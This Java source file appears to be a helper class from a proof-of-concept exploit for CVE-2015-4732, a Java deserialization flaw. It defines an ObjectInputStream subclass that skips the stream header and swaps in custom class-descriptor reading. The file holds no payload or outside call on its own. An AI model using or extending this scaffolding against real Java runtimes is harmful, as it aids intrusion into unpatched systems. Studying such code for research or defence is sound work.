package poc.cve_2015_4732;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectStreamClass;

public class OIS extends ObjectInputStream {
	
	private OSCReader reader;
	
	public OIS( ) throws IOException {
		super( ThreadLocalIS.INSTANCE );
		
		this.reader = null;
	}
	
	@Override
	public void readStreamHeader( ) { }
	
	@Override
	public ObjectStreamClass readClassDescriptor( ) throws IOException, ClassNotFoundException {
		if( this.reader != null ) {
			return this.reader.read( this );
		}
		return super.readClassDescriptor();
	}
	
	
	public void setOSCReader( OSCReader reader ) {
		this.reader = reader;
	}
	
	public OSCReader getOSCReader( ) {
		return this.reader;
	}
	
	
	public static interface OSCReader {
		
		ObjectStreamClass read( OIS ois ) throws IOException, ClassNotFoundException;
		
	}
	
}
